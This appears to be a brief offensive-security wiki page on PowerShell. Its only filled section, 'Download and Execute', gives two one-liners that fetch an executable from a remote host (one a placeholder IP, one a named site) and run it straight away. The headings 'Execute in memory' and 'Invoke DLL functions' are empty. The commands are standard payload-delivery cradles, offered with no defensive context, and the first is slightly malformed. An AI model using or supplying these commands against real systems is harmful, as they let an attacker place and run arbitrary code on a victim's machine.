<!-- TITLE: Powershell -->
<!-- SUBTITLE: A quick summary of Powershell -->

# Download and Execute
Good reference for many ways:  https://www.greyhathacker.net/?p=500

```text
powershell (New-Object System.Net.WebClient).DownloadFile('http://<ip>',c:\temp\test.exe'); (New-Object -com Shell.Application).ShellExecute('c:\temp\test.exe');

PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.g
reyhathacker.net/tools/messbox.exe','mess.exe');Start-Process 'mess.exe'

```


# Execute in memory

# Invoke DLL functions
